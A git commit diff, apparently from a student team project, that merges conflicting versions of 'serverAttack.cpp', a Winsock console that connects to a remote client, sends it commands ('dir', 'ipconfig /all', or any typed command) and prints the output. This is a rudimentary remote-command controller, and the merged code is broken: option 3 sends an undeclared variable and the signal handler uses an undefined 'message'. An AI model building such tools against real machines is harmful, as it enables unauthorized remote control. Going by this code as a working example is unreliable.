d5f57446d6d5ef116835ba955bcbf64e8a9800cf
Krieglied <41011777+Krieglied@users.noreply.github.com>
2018-08-28 15:04:37 -0500

    Merged Changes with team branch
    Implemented changes that allow for signal handling

--- TeamProject/attackServer/serverAttack.cpp
+++ TeamProject/attackServer/serverAttack.cpp
@@ -1,4 +1,3 @@
-<<<<<<< HEAD
 #define WIN32_LEAN_AND_MEAN
 
 #include <winsock2.h>
@@ -6,6 +5,7 @@
 #include <iostream>
 #include <sstream>
 #include <vector>
+#include <csignal>
 
 
 // Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
@@ -19,25 +19,23 @@
 
 void printMenu();
 int userInput(int value);
+void ctrl_c(int sig);
+void clear_cin();
 
 int main()
-=======
-#include "server.h"
-
-int __cdecl main(int argc, char **argv)
->>>>>>> ba06a49db277d3a9b5e9b8b190a64688b91e8799
 {
+	void(*old)(int);
+	old = signal(SIGINT, ctrl_c); // installs handler
+	
 	WSADATA wsaData;
 	SOCKET ConnectSocket = INVALID_SOCKET;
 	struct addrinfo *result = NULL,
 		*ptr = NULL,
 		hints;
 	int iResult;
-	int	cmdChoice = 99;
-<<<<<<< HEAD
-=======
+	int cmdChoice = 99;
+	
 	std::string inputIP;
->>>>>>> ba06a49db277d3a9b5e9b8b190a64688b91e8799
 
 	// Initialize Winsock
 	// Very necessary to make the socket work
@@ -53,14 +51,9 @@ int __cdecl main(int argc, char **argv)
 	hints.ai_socktype = SOCK_STREAM;
 	hints.ai_protocol = IPPROTO_TCP;
 
-<<<<<<< HEAD
 	// Resolve the server address and port
 	iResult = getaddrinfo(DEFAULT_ADDRESS, DEFAULT_PORT, &hints, &result);
-=======
 	inputIP = getIPaddress();
-	// Resolve the server address and port
-	iResult = getaddrinfo(inputIP.c_str(), DEFAULT_PORT, &hints, &result);
->>>>>>> ba06a49db277d3a9b5e9b8b190a64688b91e8799
 	if (iResult != 0)
 	{
 		std::cout << "WSAStartup failed with error: " << iResult << std::endl;
@@ -96,27 +89,16 @@ int __cdecl main(int argc, char **argv)
 	//Could not get a connection to the client
 	if (ConnectSocket == INVALID_SOCKET)
 	{
-<<<<<<< HEAD
-		std::cout << "Unable to connect to server!" << std::endl;
-		WSACleanup();
-		return 1;
-	}
-=======
 		std::cout << "Unable to connect to client!" << std::endl;
 		WSACleanup();
 		return 1;
 	}
 
->>>>>>> ba06a49db277d3a9b5e9b8b190a64688b91e8799
 	std::cout << "Ready to start sending commands" << std::endl;
 	std::string commands;
 	//These variables are used to store results from the client
 	std::stringstream input;
-<<<<<<< HEAD
 	char buffer[4096 * 2];
-=======
-	char newbuffer[4096 * 2];
->>>>>>> ba06a49db277d3a9b5e9b8b190a64688b91e8799
 	do
 	{
 		//Handles the user input for which command to run
@@ -126,25 +108,11 @@ int __cdecl main(int argc, char **argv)
 			//Handles user input, if not a number, send back as invalid
 			cmdChoice = userInput(cmdChoice);
 			//If not is range of the mech number, send back as invalid
-<<<<<<< HEAD
-			if (!(cmdChoice >= 0 && cmdChoice < 2))
-=======
 			if (!(cmdChoice >= 0 && cmdChoice < 4))
->>>>>>> ba06a49db277d3a9b5e9b8b190a64688b91e8799
 			{
 				std::cout << "Invalid number, please try again" << std::endl;
 			}
 			//Continue loop until user makes a valid choice
-<<<<<<< HEAD
-		} while (!(cmdChoice >= 0 && cmdChoice < 2));
-		// Might make this section a switch case that will build the command string (represented here by test)
-		// That will be sent on the socket to the client
-		if (cmdChoice == 1)
-		{
-			std::string test = "dir";
-			// Send an initial buffer
-			iResult = send(ConnectSocket, test.data(), test.size(), 0);
-=======
 		} while (!(cmdChoice >= 0 && cmdChoice < 4));
 		if (cmdChoice == 1)
 		{
@@ -154,7 +122,6 @@ int __cdecl main(int argc, char **argv)
 			// That will be sent on the socket to the client
 			// Send an initial buffer
 			iResult = send(ConnectSocket, directory.data(), directory.size(), 0);
->>>>>>> ba06a49db277d3a9b5e9b8b190a64688b91e8799
 			if (iResult == SOCKET_ERROR)
 			{
 				std::cout << "send failed with error: " << WSAGetLastError() << std::endl;
@@ -165,43 +132,12 @@ int __cdecl main(int argc, char **argv)
 			std::cout << "Bytes Sent: " << iResult << std::endl;
 			//This section will handle any input that the client sends back
 			char checkChar;
-<<<<<<< HEAD
 			do
 			{
 				iResult = recv(ConnectSocket, buffer, sizeof(buffer), 0);
 				checkChar = buffer[0];
 				//If the result is of the size of an int (<= 4 bytes) and is of value 0, then the client has 
 				//finished the return message
-=======
-			iResult = recv(ConnectSocket, newbuffer, sizeof(newbuffer), 0);
-			checkChar = newbuffer[0];
-			std::cout << "data has been received." << std::endl;
-			if (iResult <= 4 && checkChar == 0)
-			{
-				break;
-			}
-			//If message not finished, characters are put into a string stream.
-			for (int i = 0; i < iResult; i++)
-			{
-				input << newbuffer[i];
-			}
-			if (cmdChoice == 2)
-			{
-				std::string ipconfig = "ipconfig /all";
-				// Send an initial buffer
-				iResult = send(ConnectSocket, ipconfig.data(), ipconfig.size(), 0);
-				if (iResult == SOCKET_ERROR)
-				{
-					std::cout << "send failed with error: " << WSAGetLastError() << std::endl;
-					closesocket(ConnectSocket);
-					WSACleanup();
-					return 1;
-				}
-				std::cout << "Bytes Sent: " << iResult << std::endl;
-
-				iResult = recv(ConnectSocket, newbuffer, sizeof(newbuffer), 0);
-				std::cout << "data has been received." << std::endl;
->>>>>>> ba06a49db277d3a9b5e9b8b190a64688b91e8799
 				if (iResult <= 4 && checkChar == 0)
 				{
 					break;
@@ -209,7 +145,80 @@ int __cdecl main(int argc, char **argv)
 				//If message not finished, characters are put into a string stream.
 				for (int i = 0; i < iResult; i++)
 				{
-<<<<<<< HEAD
+					input << buffer[i];
+				}
+				//The buffer is clear for the next package
+				memset(buffer, 0, sizeof(buffer));
+			} while (true);
+			std::cout << input.str() << std::endl;
+			std::cout << "data has been received." << std::endl;
+		}
+		else if (cmdChoice == 2)
+		{
+			std::string ipconfig = "ipconfig /all";
+			// Send an initial buffer
+			iResult = send(ConnectSocket, ipconfig.data(), ipconfig.size(), 0);
+			if (iResult == SOCKET_ERROR)
+			{
+				std::cout << "send failed with error: " << WSAGetLastError() << std::endl;
+				closesocket(ConnectSocket);
+				WSACleanup();
+				return 1;
+			}
+			std::cout << "Bytes Sent: " << iResult << std::endl;
+
+			char checkChar;
+			do
+			{
+				iResult = recv(ConnectSocket, buffer, sizeof(buffer), 0);
+				checkChar = buffer[0];
+				//If the result is of the size of an int (<= 4 bytes) and is of value 0, then the client has 
+				//finished the return message
+				if (iResult <= 4 && checkChar == 0)
+				{
+					break;
+				}
+				//If message not finished, characters are put into a string stream.
+				for (int i = 0; i < iResult; i++)
+				{
+					input << buffer[i];
+				}
+				//The buffer is clear for the next package
+				memset(buffer, 0, sizeof(buffer));
+			} while (true);
+			std::cout << input.str() << std::endl;
+			std::cout << "data has been received." << std::endl;
+		}
+		else if (cmdChoice == 3)
+		{
+			std::string cmdInput;
+			std::cout << "Type command to be used (type/utilize exact command syntax to send)" << std::endl;
+			
+			// Send an initial buffer
+			iResult = send(ConnectSocket, ipconfig.data(), ipconfig.size(), 0);
+			if (iResult == SOCKET_ERROR)
+			{
+				std::cout << "send failed with error: " << WSAGetLastError() << std::endl;
+				closesocket(ConnectSocket);
+				WSACleanup();
+				return 1;
+			}
+			std::cout << "Bytes Sent: " << iResult << std::endl;
+
+			char checkChar;
+			do
+			{
+				iResult = recv(ConnectSocket, buffer, sizeof(buffer), 0);
+				checkChar = buffer[0];
+				//If the result is of the size of an int (<= 4 bytes) and is of value 0, then the client has 
+				//finished the return message
+				if (iResult <= 4 && checkChar == 0)
+				{
+					break;
+				}
+				//If message not finished, characters are put into a string stream.
+				for (int i = 0; i < iResult; i++)
+				{
 					input << buffer[i];
 				}
 				//The buffer is clear for the next package
@@ -222,55 +231,6 @@ int __cdecl main(int argc, char **argv)
 		input.str(std::string());
 		input.clear();
 	} while (cmdChoice != 0);
-
-=======
-					input << newbuffer[i];
-				}
-			}
-			if (cmdChoice == 3)
-			{
-				std::string cmdInput;
-				std::cout << "Type command to be used (type/utilize exact command syntax to send)" << std::endl;
-				std::getline(std::cin, cmdInput);
-				// Send an initial buffer
-				iResult = send(ConnectSocket, cmdInput.data(), cmdInput.size(), 0);
-				if (iResult == SOCKET_ERROR)
-				{
-					std::cout << "send failed with error: " << WSAGetLastError() << std::endl;
-					closesocket(ConnectSocket);
-					WSACleanup();
-					return 1;
-				}
-				std::cout << "Bytes Sent: " << iResult << std::endl;
-				//This section will handle any input that the client sends back
-				char checkChar;
-				do
-				{
-					iResult = recv(ConnectSocket, newbuffer, sizeof(newbuffer), 0);
-					checkChar = newbuffer[0];
-					//If the result is of the size of an int (<= 4 bytes) and is of value 0, then the client has 
-					//finished the return message
-					if (iResult <= 4 && checkChar == 0)
-					{
-						break;
-					}
-					//If message not finished, characters are put into a string stream.
-					for (int i = 0; i < iResult; i++)
-					{
-						input << newbuffer[i];
-					}
-					//The buffer is clear for the next package
-					memset(newbuffer, 0, sizeof(newbuffer));
-				} while (true);
-				std::cout << input.str() << std::endl;
-				std::cout << "data has been received." << std::endl;
-			}
-			//Input from the client is complete, string stream needs to be reset
-			input.str(std::string());
-			input.clear();
-		}
-	} while (cmdChoice != 0);
->>>>>>> ba06a49db277d3a9b5e9b8b190a64688b91e8799
 	// shutdown the connection since no more data will be sent
 	iResult = shutdown(ConnectSocket, SD_SEND);
 	if (iResult == SOCKET_ERROR)
@@ -280,33 +240,40 @@ int __cdecl main(int argc, char **argv)
 		WSACleanup();
 		return 1;
 	}
-<<<<<<< HEAD
 
-=======
->>>>>>> ba06a49db277d3a9b5e9b8b190a64688b91e8799
 	// cleanup
 	closesocket(ConnectSocket);
 	WSACleanup();
 
 	return 0;
-<<<<<<< HEAD
-=======
-
->>>>>>> ba06a49db277d3a9b5e9b8b190a64688b91e8799
+}
+void ctrl_c(int sig) {
+	std::cerr << "Ctrl-C caught" << std::endl;
+	signal(sig, ctrl_c); // re-installs handler
+	if (message == "Menu")
+	{
+		printMenu();
+	}
+	else
+	{
+		std::cout << message << std::endl;
+	}
+}
+void clear_cin()
+{
+	if (std::cin.fail() || std::cin.eof()) 
+	{
+		std::cin.clear(); // reset cin state
+	}
 }
 // Function that will display to the user a list of commands to run on client
 void printMenu()
 {
 	std::cout << "Please select a command:" << std::endl;
-<<<<<<< HEAD
-	std::cout << "Test Command (1)" << std::endl;
-	std::cout << "Exit (0)" << std::endl;
-=======
 	std::cout << "(1) Quick Grab - Current Directory Content List" << std::endl;
 	std::cout << "(2) Quick Grab - IP Configuration" << std::endl;
 	std::cout << "(3) Input your own command" << std::endl;
 	std::cout << "(0) Exit" << std::endl;
->>>>>>> ba06a49db277d3a9b5e9b8b190a64688b91e8799
 }
 //Determines if the user input a correct command
 int userInput(int value)
